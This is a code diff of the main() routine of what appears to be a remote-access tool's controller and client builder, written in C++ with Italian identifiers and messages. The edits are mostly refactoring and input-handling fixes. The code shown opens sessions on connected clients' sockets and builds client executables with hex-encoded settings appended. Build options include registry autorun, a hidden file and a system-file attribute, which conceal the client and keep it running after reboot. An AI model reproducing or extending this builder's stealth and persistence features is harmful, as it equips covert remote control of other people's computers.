@@ -9,22 +9,22 @@ using namespace std;
 
 #define MAX_CLIENTS 1000
 
-#include "Client.h"
+#include "Client.hpp"
 
-string Version = "2.0.0-b.6";
+string Version = "2.0.0-b.7";
 CLIENT Clients[MAX_CLIENTS];
 atomic<bool> ServerLoopController = true;
 
-#include "SettaggiServer.h"
-#include "SettaggiClient.h"
-#include "ClientUtils.h"
-#include "CliFileExplorer.h"
+#include "SettaggiServer.hpp"
+#include "SettaggiClient.hpp"
+#include "ClientUtils.hpp"
+#include "CliFileExplorer.hpp"
 
 ClientUtils* Clu;
 
-#include "Comunicazioni.h"
-#include "Funzioni.h"
-#include "Sessione.h"
+#include "Comunicazioni.hpp"
+#include "Funzioni.hpp"
+#include "Sessione.hpp"
 
 int main()
 {
@@ -143,7 +143,7 @@ int main()
         cli.LoadingPercentage = 90;
         cli.LoadingText = "Avvio Servizi...";
 
-        thread Aconn(AccettaConnessioni, ref(Server));
+        thread Aconn(AccettaConnessioni, std::ref(Server), std::ref(SettaggiS.MostraNotifiche));
         thread Vconn(VerificaConnessioni);
         Aconn.detach();
         Vconn.detach();
@@ -173,10 +173,7 @@ int main()
 
                 for (int i = 0; i < MAX_CLIENTS; i++)
                     if (Clients[i].IsConnected)
-                    {
-                        closesocket(Clients[i].sock);
-                        Clients[i].IsConnected = false;
-                    }
+                        Clients[i].Kill();
 
                 Server.Stop();
                 CicloMenu = false;
@@ -218,21 +215,24 @@ int main()
 
                 if (BodyTabella.size() > 0)
                 {
-                    int IDclient = -1;
+                    int IdClient = -1;
                     bool Controllo = false;
+                    string strIdClient;
 
                     cli.Table(HeaderTabella, BodyTabella);
                     cout << "\nScegli l'ID del Client." << endl;
                     StampaPrefix();
-                    cin >> IDclient;
-                    cin.ignore();
+                    getline(cin, strIdClient);
 
-                    if (IDclient < MAX_CLIENTS && IDclient >= 0)
+                    try { IdClient = stoi(strIdClient); }
+                    catch (exception ex) {}
+
+                    if (IdClient < MAX_CLIENTS && IdClient >= 0)
                     {
-                        if (Clients[IDclient].IsConnected)
+                        if (Clients[IdClient].IsConnected)
                         {
-                            Sess.ID = IDclient;
-                            Sess.Sock = Clients[IDclient].sock;
+                            Sess.ID = IdClient;
+                            Sess.Sock = Clients[IdClient].sock;
                             
                             Sess.AvviaSessione();
                         }
@@ -275,30 +275,42 @@ int main()
                             CicloMenu = false;
                             break;
 
-                            // Host
+                        // Host
                         case 1:
+                        {
                             cout << "\nInserisci l'host." << endl;
                             StampaPrefix();
                             getline(cin, SettaggiC.Host);
                             break;
+                        }
 
-                            // Porta
+                        // Porta
                         case 2:
+                        {
+                            string strPorta;
+
                             cout << "\nInserisci la porta." << endl;
                             StampaPrefix();
-                            cin >> SettaggiC.Porta;
-                            cin.ignore();
-                            break;
+                            getline(cin, strPorta);
 
-                            // Percorso d'Installazione
+                            try { SettaggiC.Porta = stoi(strPorta); }
+                            catch (exception ex) {}
+
+                            break;
+                        }
+
+                        // Percorso d'Installazione
                         case 3:
+                        {
                             cout << "\nScegli il percorso d'installazione." << endl;
 
                             SettaggiC.InstallPath = Percorsi[cli.MenuSingleSelScorrimento(Percorsi, tc.Purple)];
                             break;
+                        }
 
-                            // Nome Exe
+                        // Nome Exe
                         case 4:
+                        {
                             cout << "\nInserisci il nome del file .exe" << endl;
                             StampaPrefix();
                             getline(cin, SettaggiC.ExeName);
@@ -320,24 +332,26 @@ int main()
                                 Sleep(1500);
                             }
                             break;
+                        }
 
-                            // Auto Run
+                        // Auto Run
                         case 5:
                             SettaggiC.RegStartup = !SettaggiC.RegStartup;
                             break;
 
-                            // File Nascosto
+                        // File Nascosto
                         case 6:
                             SettaggiC.HideExe = !SettaggiC.HideExe;
                             break;
 
-                            // File di Sistema
+                        // File di Sistema
                         case 7:
                             SettaggiC.SystemFile = !SettaggiC.SystemFile;
                             break;
 
-                            // Crea Client
+                        // Crea Client
                         case 8:
+                        {
                             cout << endl;
 
                             cli.LoadingPercentage = 0;
@@ -383,9 +397,26 @@ int main()
                             cli.LoadingPercentage = 75;
                             cli.LoadingText = "Personalizzazione settaggi";
 
-                            du.AppendToFile(SettaggiC.ExeName, en.AsciiToHex("{START}" + SettaggiC.DumpSettingsForBuild() + "{END}"));
+                            if (!du.AppendToFile(SettaggiC.ExeName, en.AsciiToHex("{START}" + SettaggiC.DumpSettingsForBuild() + "{END}")))
+                            {
+                                Sleep(500);
+
+                                if (!du.AppendToFile(SettaggiC.ExeName, en.AsciiToHex("{START}" + SettaggiC.DumpSettingsForBuild() + "{END}")))
+                                {
+                                    cli.StopBar();
+                                    tc.SetColor(tc.Red);
+                                    cout << "\nErrore durante la scrittura dei settaggi.\nRiprova." << endl;
+                                    tc.SetColor(tc.Default);
+                                    Sleep(3000);
+
+                                    du.DelFile(SettaggiC.ExeName);
+
+                                    break;
+                                }
+                            }
 
                             cli.LoadingPercentage = 100;
+                            Sleep(100);
                             cli.StopBar();
 
                             tc.SetColor(tc.Lime);
@@ -395,6 +426,7 @@ int main()
                             Sleep(1500);
                             CicloMenu = false;
                             break;
+                        }
                     }
 
                     SettaggiC.SetSettings();
@@ -441,22 +473,25 @@ int main()
                             break;
                         }
 
-                            // Porta
+                        // Porta
                         case 1:
                         {
+                            string strPorta;
                             OldPort = SettaggiS.Porta;
 
                             cout << "\nInserisci la porta." << endl;
                             StampaPrefix();
-                            cin >> SettaggiS.Porta;
-                            cin.ignore();
+                            getline(cin, strPorta);
+
+                            try { SettaggiS.Porta = stoi(strPorta); }
+                            catch (exception ex) {}
 
                             if (OldPort != SettaggiS.Porta)
                             {
                                 cout << "Riavvio del Server in corso";
                                 cli.DotsBar();
 
-                                ServerOn = RestartServer(Server, SettaggiS.Porta);
+                                ServerOn = RestartServer(Server, SettaggiS.Porta, SettaggiS.MostraNotifiche);
                                 cli.StopBar(); cout << endl;
 
                                 if (ServerOn)
@@ -482,7 +517,7 @@ int main()
                             break;
                         }
 
-                            // Aggiornamenti
+                        // Aggiornamenti
                         case 2:
                         {
                             SettaggiS.VerificaAggiornamenti = !SettaggiS.VerificaAggiornamenti;
@@ -491,14 +526,14 @@ int main()
                             break;
                         }
 
-                            // Auto Aggiornamenti
+                        // Auto Aggiornamenti
                         case 3:
                         {
                             SettaggiS.AutoAggiornamento = !SettaggiS.AutoAggiornamento;
                             break;
                         }
 
-                            // Dimensione della finestra
+                        // Dimensione della finestra
                         case 4:
                         {
                             cout << "\nRidimensiona la finestra a piacimento e premi invio per salvare." << endl;
@@ -506,6 +541,13 @@ int main()
 
                             SettaggiS.DimensioniFinestra.X = wu.GetWindowSize().X;
                             SettaggiS.DimensioniFinestra.Y = wu.GetWindowSize().Y;
+                            break;
+                        }
+
+                        // Mostra Notifiche
+                        case 5:
+                        {
+                            SettaggiS.MostraNotifiche = !SettaggiS.MostraNotifiche;
                             break;
                         }
                     }
